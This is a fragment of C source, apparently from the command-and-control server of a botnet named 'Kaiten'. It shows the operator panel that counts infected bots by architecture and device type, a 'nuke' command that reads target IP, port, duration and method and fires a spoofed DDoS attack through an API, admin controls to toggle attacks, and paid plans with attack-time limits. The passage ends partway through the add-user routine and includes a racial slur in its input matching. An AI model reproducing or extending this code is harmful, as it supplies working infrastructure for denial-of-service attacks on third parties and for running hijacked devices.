	  			send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
	  			if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;				
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;
	  			sprintf(synpur8, "\e[1;35mRoot Count: [%d] \r\n",  botsconnect());
      			if(send(datafd, synpur8, strlen(synpur8), MSG_NOSIGNAL) == -1) goto end;
	
        	    if(x86Connected() != 0)
        	    {
        	        sprintf(synpur1,"\e[1;35mx86 / \e[1;36mRoots: \e[1;37m[%d] \r\n",     x86Connected());
        	        if(send(datafd, synpur1, strlen(synpur1), MSG_NOSIGNAL) == -1) goto end;
        	    }
        	    if(armConnected() != 0)
        	    {
        	        sprintf(synpur2,"\e[1;35mArm / \e[1;36mJAWS: \e[1;37m[%d] \r\n",     armConnected());
        	        if(send(datafd, synpur2, strlen(synpur2), MSG_NOSIGNAL) == -1) goto end;
        	    }
        	    if(mipsConnected() != 0)
        	    {
        	        sprintf(synpur3,"\e[1;35mMips / \e[1;36mSSH Bots: \e[1;37m[%d] \r\n",     mipsConnected());
        	        if(send(datafd, synpur3, strlen(synpur3), MSG_NOSIGNAL) == -1) goto end;
        	    }
        	    if(mpslConnected() != 0)
        	    {
        	        sprintf(synpur4,"\e[1;35mMpsl / \e[1;36mTelnet Bots: \e[1;37m[%d] \r\n",     mpslConnected());
        	        if(send(datafd, synpur4, strlen(synpur4), MSG_NOSIGNAL) == -1) goto end;
        	    }
        	    if(ppcConnected() != 0)
        	    {
        	        sprintf(synpur5,"\e[1;35mPpc / \e[1;36mNetgear: \e[1;37m[%d] \r\n",     ppcConnected());
        	        if(send(datafd, synpur5, strlen(synpur5), MSG_NOSIGNAL) == -1) goto end;
        	    }
        	    if(spcConnected() != 0)
        	    {
        	        sprintf(synpur6,"\e[1;35mSpc / \e[1;36mZTE: \e[1;37m[%d] \r\n",     spcConnected());
        	        if(send(datafd, synpur6, strlen(synpur6), MSG_NOSIGNAL) == -1) goto end;
        	    }
        	    if(unknownConnected() != 0)
        	    {
        	        sprintf(synpur7,"\e[1;35mUnknown: \e[1;37m[%d] \r\n",     unknownConnected());
        	        if(send(datafd, synpur7, strlen(synpur7), MSG_NOSIGNAL) == -1) goto end;
        	    }
				pthread_create(&title, NULL, &TitleWriter, sock);
			
			}


 			 if(strcasestr(buf, "media") || strstr(buf, "MEDIA") || strstr(buf, "Media") || strstr(buf, "Social") || strstr(buf, "med") || strstr(buf, "nigga"))
 			{
 	  			send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);	
 	  			if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;		
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

        char p2  [800];
        char p3  [800];
        char p4  [800];
        char p5  [800];
        char p6  [800];
        char p7  [800];            
        char p10  [800];          
        char p11  [800];
        char p12  [800];


                //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m

                sprintf(p2,   "\e[38;2;255;0;211m ╔═════\e[38;2;199;53;221m══════\e[38;2;143;106;231m══════\e[38;2;88;159;240m══════════════╗\r\n");                    
                sprintf(p3,   "\e[38;2;255;0;211m ║    S \e[38;2;199;53;221mo c i \e[38;2;143;106;231ma l   \e[38;2;88;159;240mM e d i a    ║\r\n");                      
                sprintf(p4,   "\e[38;2;255;0;211m ╚═══════\e[38;2;199;53;221m══════\e[38;2;143;106;231m══════\e[38;2;88;159;240m════════════╝\r\n");
                sprintf(p5,   "\e[38;2;255;0;211m   ╔══════\e[38;2;199;53;221m══════\e[38;2;143;106;231m══════\e[38;2;88;159;240m═════════╗  \r\n");
                sprintf(p6,   "\e[38;2;255;0;211m     @kaite\e[38;2;199;53;221mn_kbot\e[38;2;143;106;231m // Ow\e[38;2;88;159;240mner        \r\n");
                sprintf(p7,   "\e[38;2;255;0;211m     @11xrvt\e[38;2;199;53;221m      \e[38;2;143;106;231m// Co-\e[38;2;88;159;240mOwner     \r\n"); 
                sprintf(p10,  "\e[38;2;255;0;211m     @ft.fayg\e[38;2;199;53;221mo    /\e[38;2;143;106;231m/ Owne\e[38;2;88;159;240mr        \r\n");
                sprintf(p11,  "\e[38;2;255;0;211m       Love: [\e[38;2;199;53;221mkomodo\e[38;2;143;106;231m & aud\e[38;2;88;159;240mi]      \r\n");
                sprintf(p12,  "\e[38;2;255;0;211m   ╚═══════════\e[38;2;199;53;221m══════\e[38;2;143;106;231m══════\e[38;2;88;159;240m════╝  \r\n");
      
        if(send(datafd, p2,  strlen(p2), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p3,  strlen(p3), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p4,  strlen(p4), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p5,  strlen(p5), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p6,  strlen(p6), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p7,  strlen(p7), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p10,  strlen(p10), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p11,  strlen(p11), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p12,  strlen(p12), MSG_NOSIGNAL) == -1) goto end;
 			}

 		    if(strcasestr(buf, "admin"))
 		    {
				if(!strcasecmp(accounts[find_line].admin, "admin"))
				{
					pthread_create(&title, NULL, &TitleWriter, sock);
	  				send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);	
	  				if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;			
	  				if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  				if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

					char admin1  [800];
					char admin2  [800];
					char admin3  [800];
					char admin4  [800];
					char admin5  [800];
					char admin6  [800];
					char admin7  [800];
					char admin8  [800];
					char admin9  [800];

					                //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m


					sprintf(admin1,  "\e[38;2;255;0;211m╔═════════\e[38;2;227;27;216m══════════\e[38;2;199;53;221m══════════\e[38;2;171;80;226m══════╗╔══\e[38;2;143;106;231m══════════\e[38;2;88;159;240m═════════════════════════╗\r\n");
					sprintf(admin2,  "\e[38;2;255;0;211m║user  --  \e[38;2;227;27;216mShows All \e[38;2;199;53;221mUser Comma\e[38;2;171;80;226mnds  ║║tog\e[38;2;143;106;231mgleattacks\e[38;2;88;159;240m -- Turns Attacks On/Off║\r\n");
					sprintf(admin3,  "\e[38;2;255;0;211m╚═══════════\e[38;2;227;27;216m══════════\e[38;2;199;53;221m══════════\e[38;2;171;80;226m════╝╚════\e[38;2;143;106;231m══════════\e[38;2;88;159;240m═══════════════════════╝\r\n");
					sprintf(admin4,  "\e[38;2;255;0;211m╔════════════\e[38;2;227;27;216m══════════\e[38;2;199;53;221m══════════\e[38;2;171;80;226m═══╗╔═════\e[38;2;143;106;231m══════════\e[38;2;88;159;240m══════════════════════╗\r\n");
					sprintf(admin5,  "\e[38;2;255;0;211m║broadcast -- \e[38;2;227;27;216mBroadcasts\e[38;2;199;53;221m A Message\e[38;2;171;80;226m  ║║toggle\e[38;2;143;106;231mlogin -- S\e[38;2;88;159;240mhows Incoming Logins ║\r\n");
					sprintf(admin6,  "\e[38;2;255;0;211m╚══════════════\e[38;2;227;27;216m══════════\e[38;2;199;53;221m══════════\e[38;2;171;80;226m═╝╚═══════\e[38;2;143;106;231m══════════\e[38;2;88;159;240m════════════════════╝\r\n");
					sprintf(admin7,  "\e[38;2;255;0;211m╔═══════════════\e[38;2;227;27;216m══════════\e[38;2;199;53;221m══════════\e[38;2;171;80;226m╗\r\n");
					sprintf(admin8,  "\e[38;2;255;0;211m║togglelisten -- \e[38;2;227;27;216mShows Sent\e[38;2;199;53;221m Attacks ║\r\n");
					sprintf(admin9,  "\e[38;2;255;0;211m╚═════════════════\e[38;2;227;27;216m══════════\e[38;2;199;53;221m════════╝\r\n");	
	
					if(send(datafd, admin1, strlen(admin1), MSG_NOSIGNAL) == -1) goto end; 
					if(send(datafd, admin2, strlen(admin2), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, admin3, strlen(admin3), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, admin4, strlen(admin4), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, admin5, strlen(admin5), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, admin6, strlen(admin6), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, admin7, strlen(admin7), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, admin8, strlen(admin8), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, admin9, strlen(admin9), MSG_NOSIGNAL) == -1) goto end;
					pthread_create(&title, NULL, &TitleWriter, sock);
			 	}
 			}	


 			else if(strcasestr(buf, "account"))
 			{
 				char info1[800];
 				char info2[800];
 				char info3[800];
 				char info4[800];
 				char info5[800];
 				//char info6[800];
	
 				sprintf(info1, "[Kaiten Username]: %s \r\n", managements[datafd].id);
 				sprintf(info2, "[Kaiten Plan]:     %s \r\n", managements[datafd].planname);
 				sprintf(info3, "[Attack Time]:     %d \r\n", managements[datafd].mymaxtime);
 				sprintf(info4, "[Cooldown Time]:   %d \r\n", managements[datafd].mycooldown);
 				sprintf(info5, "[Attacks Running]: %d \r\n", Sending[datafd].amountofatks);
	
 				if(send(datafd, info1, strlen(info1), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, info2, strlen(info2), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, info3, strlen(info3), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, info4, strlen(info4), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, info5, strlen(info5), MSG_NOSIGNAL) == -1) goto end;
 				//if(send(datafd, info6, strlen(info6), MSG_NOSIGNAL) == -1) goto end;
 			}


				
///////////////////////////////////////////////////////////////////////////////////////////////START OF EXTRA COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////START OF EXTRA COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////START OF EXTRA COMMANDS////////////////////////////////////////////////////////////////////////////

			else if(strcasestr(buf, "msg") || strcasestr(buf, "message"))
			{	
				int tosend;
				char sentmsg[800];
				char msg[800];
				char usertomsg[800];
				sprintf(usethis, "User:");
				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
				memset(buf, 0, sizeof(buf));
				if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
				trim(buf);
				strcpy(usertomsg, buf);
		
				sprintf(usethis, "MSG:");
				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
				memset(buf, 0, sizeof(buf));
				if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
				trim(buf);
				strcpy(msg, buf);
				if(strcasestr(msg, "nigger") || strcasestr(msg, "nig") || strcasestr(msg, "n1g") || strcasestr(msg, "nlg") || strcasestr(msg, "n.i.g") || strcasestr(msg, "n!g") || strcasestr(msg, "n|g"))
				{
					sprintf(usethis, "\e[1;31mThis Word Is Not Allowed Here!\r\n");
					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					sleep(2);
				} else {
		
				for(tosend=0;tosend < MAXFDS;tosend++){
					if(strstr(managements[tosend].id, usertomsg))
					{
						if(managements[tosend].msgtoggle == 0)
						{
							char sendmsg[800];
							sprintf(sendmsg, "\r\n\e[1;36mMessage From %s: %s\r\n", managements[datafd].id, msg);
							if(send(tosend, sendmsg, strlen(sendmsg), MSG_NOSIGNAL) == -1) goto end;
							sprintf(sendmsg, "\r\n\e[1;35m%s@\e[1;36m[Kaiten]:\e[1;37m", managements[tosend].id);
							if(send(tosend, sendmsg, strlen(sendmsg), MSG_NOSIGNAL) == -1) goto end;
							sent = 1;
						} else {
							sent = 3;
						}
					}
				}		
					if(sent == 1)
					{
						printf("[Kaiten]:%s Sent A Message To:%s Msg: %s\n", managements[datafd].id, usertomsg, msg);
						sprintf(sentmsg, "\e[1;35mMessage Sent To: \e[1;37m%s\r\n", usertomsg);
						if(send(datafd, sentmsg, strlen(sentmsg), MSG_NOSIGNAL) == -1) goto end;
						sent = 0;
					}
					else if(sent == 3)
					{
						sprintf(usethis, "\e[1;31mUser \e[1;37m%s \e[1;31mHas Messages Turned OFF\r\n", usertomsg);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					}
		
					else if(!sent)  
					{
						sprintf(usethis, "\e[1;31User \e[1;37m%s \e[1;31Is not online\r\n", usertomsg);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(msg,0,sizeof(msg));
					} 
				}
				memset(buf,0,sizeof(buf));
			}

			if(strcasestr(buf, "online"))
			{
			      send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);		
			      if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;		
				  if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
				  if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
				  if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
				  if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
				  if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
				  if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
				  if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
				  if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
				  if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
				  if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
				  if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;
				if(managements[datafd].adminstatus == 1)
				{
					int online;
					sprintf(usethis, "\e[1;35mUsers Online\r\n");
					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					for(online=0;online < MAXFDS; online++)
					{
						if(strlen(managements[online].id) > 1 && managements[online].connected == 1) 
						{
							if(strcmp(managements[online].planname, "admin") == 0)
							{
								sprintf(botnet, "\e[1;32mUser\e[1;37m: [%s] | IP: \e[1;31mADMIN IP\r\n", managements[online].id);
								if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
							} else {
								sprintf(botnet, "\e[1;32mUser\e[1;37m: [%s] | IP: \e[1;31m%s\r\n", managements[online].id, managements[online].my_ip);
								if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
							}
						}
					}
				} else 
				{
					int online;
					for(online=0;online < MAXFDS; online++)
					{
						if(strlen(managements[online].id) > 1 && managements[online].connected == 1) 
						{
							sprintf(botnet, "\e[1;32mUser\e[1;37m: [%s] | IP: \e[1;31m**********\r\n", managements[online].id);
							if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
						}
					}
				}
				sprintf(botnet, "\e[1;35mTotal Users Online: \e[1;36m[%d]\r\n", OperatorsConnected);
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
			}


///////////////////////////////////////////////////////////////////////////////////////////////END OF EXTRA COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////END OF EXTRA COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////END OF EXTRA COMMANDS////////////////////////////////////////////////////////////////////////////
if(strstr(buf, "nuke"))
        {
        	pthread_create(&title, NULL, &TitleWriter, sock);
        	char bener[1024];
            char ip[80];
            char port[80];
            char time[80];
            char method[80];

            sprintf(bener, "IP: ");
            if(send(datafd, bener, strlen(bener), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof buf);
            read(datafd, buf, sizeof(buf));
            trim(buf);
            strcpy(ip, buf);
            sleep(2);

            sprintf(bener, "Port: ");
            if(send(datafd, bener, strlen(bener), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof buf);
            read(datafd, buf, sizeof(buf));
            trim(buf);
            strcpy(port, buf);
            sleep(2);

            sprintf(bener, "Time: ");
            if(send(datafd, bener, strlen(bener), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof buf);
            read(datafd, buf, sizeof(buf));
            trim(buf);
            strcpy(time, buf);
            sleep(2);

            sprintf(bener, "Method: ");
            if(send(datafd, bener, strlen(bener), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof buf);
            read(datafd, buf, sizeof(buf));
            trim(buf);
            strcpy(method, buf);
            sleep(2);

            if(apicall("spoofed", ip, port, time, method));

            sprintf(bener, "[Attack From Nuclear API Sent!]");
            if(send(datafd, bener, strlen(bener), MSG_NOSIGNAL) == -1) goto end;

            char input [5000];
        	sprintf(input, "\r\n\e[1;35m%s@\e[1;36m[Kaiten]:\e[1;37m", accounts[find_line].username);
			if(send(datafd, bener, strlen(bener), MSG_NOSIGNAL) == -1) goto end;
			continue;
			}

///////////////////////////////////////////////////////////////////////////////////////////////START OF ADMIN COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////START OF ADMIN COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////START OF ADMIN COMMANDS////////////////////////////////////////////////////////////////////////////
			if(strcasestr(buf, "user")) {
				if(managements[datafd].adminstatus == 1)
				{
					char options[80];
					char cmd1[800];
					char send1[800];
					char whatyucanuse1[2048];
					char whatyucanuse2[2048];
					char whatyucanuse3[2048];
					char whatyucanuse4[2048];
					char whatyucanuse5[2048];
					char whatyucanuse6[2048];
					char whatyucanuse7[2048];
					char whatyucanuse8[2048];
					char whatyucanuse9[2048];
					char whatyucanuse10[2048];
					char whatyucanuse11[2048];
					char whatyucanuse12[2048];
					char whatyucanuse13[2048];
					char whatyucanuse14[2048];
					char whatyucanuse15[2048];
					char whatyucanuse16[2048];
					char whatyucanuse17[2048];
					char whatyucanuse18[2048];

										                //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m
			
			
					sprintf(whatyucanuse1,  "    \e[38;2;255;0;211m╔═══════════════════════════════════════════╗\r\n");
					sprintf(whatyucanuse2,  "    \e[38;2;255;0;211m║[1] Add User -- Adds A User................║\r\n");
					sprintf(whatyucanuse3,  "    \e[38;2;255;0;211m╠═══════════════════════════════════════════╣\r\n");
					sprintf(whatyucanuse4,  "    \e[38;2;255;0;211m║[2] Remove User -- Removes A User..........║\r\n");
					sprintf(whatyucanuse5,  "    \e[38;2;255;0;211m╠═══════════════════════════════════════════╣\r\n");
					sprintf(whatyucanuse6,  "    \e[38;2;255;0;211m║[3] Ban User -- Bans A Users Account.......║\r\n");
					sprintf(whatyucanuse7,  "    \e[38;2;255;0;211m╠═══════════════════════════════════════════╣\r\n");
					sprintf(whatyucanuse8,  "    \e[38;2;255;0;211m║[4] Unban User -- Unbans A Users Account...║ \r\n");
					sprintf(whatyucanuse9,  "    \e[38;2;255;0;211m╠═══════════════════════════════════════════╣ \r\n");
					sprintf(whatyucanuse10, "    \e[38;2;255;0;211m║[5] IPBan -- Bans A Users IP Address.......║ \r\n");                 // adduser = 1
					sprintf(whatyucanuse11, "    \e[38;2;255;0;211m╠═══════════════════════════════════════════╣ \r\n");                 // remove user = 2
					sprintf(whatyucanuse12, "    \e[38;2;255;0;211m║[6] Un-IPBan -- Unbans A Users IP Address..║ \r\n");                 // Ban user = 3
 					sprintf(whatyucanuse13, "    \e[38;2;255;0;211m╠═══════════════════════════════════════════╣ \r\n");                 // UnBan User= 4
					sprintf(whatyucanuse14, "    \e[38;2;255;0;211m║[7] Kick User -- Kicks A User Off The Net..║ \r\n");                 // IP-Ban User = 5
					sprintf(whatyucanuse15, "    \e[38;2;255;0;211m╠═══════════════════════════════════════════╣ \r\n");                 // UnIpBan User = 6
					sprintf(whatyucanuse16, "    \e[38;2;255;0;211m║[8] Blacklist -- Blacklists An IP (Good)...║ \r\n");                 // Kick User = 7
					sprintf(whatyucanuse17, "    \e[38;2;255;0;211m╚═══════════════════════════════════════════╝ \r\n");                 // Blacklist = 8
					sprintf(whatyucanuse18, "    \e[1;37m           Choose: \e[1;33m1 - 2 - 3 - 4 - 5 - 6 - 7 - 8 \r\n");
			
			
					if(send(datafd, whatyucanuse1, strlen(whatyucanuse1), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse2, strlen(whatyucanuse2), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse3, strlen(whatyucanuse3), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse4, strlen(whatyucanuse4), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse5, strlen(whatyucanuse5), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse6, strlen(whatyucanuse6), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse7, strlen(whatyucanuse7), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse8, strlen(whatyucanuse8), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse9, strlen(whatyucanuse9), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse10, strlen(whatyucanuse10), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse11, strlen(whatyucanuse11), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse12, strlen(whatyucanuse12), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse13, strlen(whatyucanuse13), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse14, strlen(whatyucanuse14), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse15, strlen(whatyucanuse15), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse16, strlen(whatyucanuse16), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse17, strlen(whatyucanuse17), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse18, strlen(whatyucanuse18), MSG_NOSIGNAL) == -1) goto end;
			
					sprintf(options, "\e[38;5;190mOption:");
					if(send(datafd, options, strlen(options), MSG_NOSIGNAL) == -1) goto end;
					memset(buf, 0, sizeof(buf));
					if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
					trim(buf);
			
					if(strstr(buf, "1") || strstr(buf, "ONE") || strstr(buf, "One") || strstr(buf, "one"))
					{
						char username1[80];
						char password1[80];
						char status1[80];
						char maxtime1[80];
						char cooldown1[80];
						char newexpiry[800];
						char send1[1024];
						char new1 [800];
						char new2 [800];
						sprintf(usethis, "\e[1;35mUsename:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(username1, buf);
			
						sprintf(usethis, "\e[1;36mPassword:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(password1, buf);
			
						sprintf(usethis, "\e[1;35madmin(y or n):");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						
						if(strstr(buf, "y") || strstr(buf, "Y") || strstr(buf, "yes") || strstr(buf, "Yes") || strstr(buf, "YES"))
						{
							strcpy(status1, "admin");
							strcpy(maxtime1, "1600");
							strcpy(cooldown1, "60");
							strcpy(newexpiry, "99/99/99");
							goto thing;
						} 
			
						sprintf(usethis, "   \e[1;35m╔═══════╗ ╔═══════╗ ╔═══════╗ ╔═══════╗ ╔═══════╗\r\n   ║\e[1;36m CUTIE \e[1;35m║ ║\e[1;36m NORMAL\e[1;35m║ ║ \e[1;36m VIP \e[1;35m ║ ║ \e[1;36m PRO \e[1;35m ║ ║\e[1;36m GODLY \e[1;35m║\r\n   \e[1;35m╚═══════╝ ╚═══════╝ ╚═══════╝ ╚═══════╝ ╚═══════╝\r\n");
						sprintf(new1,    "   \e[1;35m╔═══════╗ ╔═══════╗ ╔═══════╗ ╔═══════╗ ╔═══════╗\r\n   ║\e[1;36m 300 S \e[1;35m║ ║\e[1;36m 600 S \e[1;35m║ ║ \e[1;36m1300S\e[1;35m ║ ║ \e[1;36m2100S\e[1;35m ║ ║\e[1;36m 3600S \e[1;35m║\r\n   \e[1;35m╚═══════╝ ╚═══════╝ ╚═══════╝ ╚═══════╝ ╚═══════╝\r\n \e[1;37m [_-_]: C = Cooldown\r\n");
						sprintf(new2,    "   \e[1;35m╔═══════╗ ╔═══════╗ ╔═══════╗ ╔═══════╗ ╔═══════╗\r\n   ║\e[1;36m 100 C \e[1;35m║ ║\e[1;36m 100 C \e[1;35m║ ║ \e[1;36m 80 C\e[1;35m ║ ║ \e[1;36m 60 C\e[1;35m ║ ║\e[1;36m  85 C \e[1;35m║\r\n   \e[1;35m╚═══════╝ ╚═══════╝ ╚═══════╝ ╚═══════╝ ╚═══════╝\r\n \e[1;37m [_-_]: S = Seconds\r\n");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			            if(send(datafd, new1, strlen(new1), MSG_NOSIGNAL) == -1) goto end;
			            if(send(datafd, new2, strlen(new2), MSG_NOSIGNAL) == -1) goto end;

						sprintf(usethis, "\e[1;35mPlan:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);

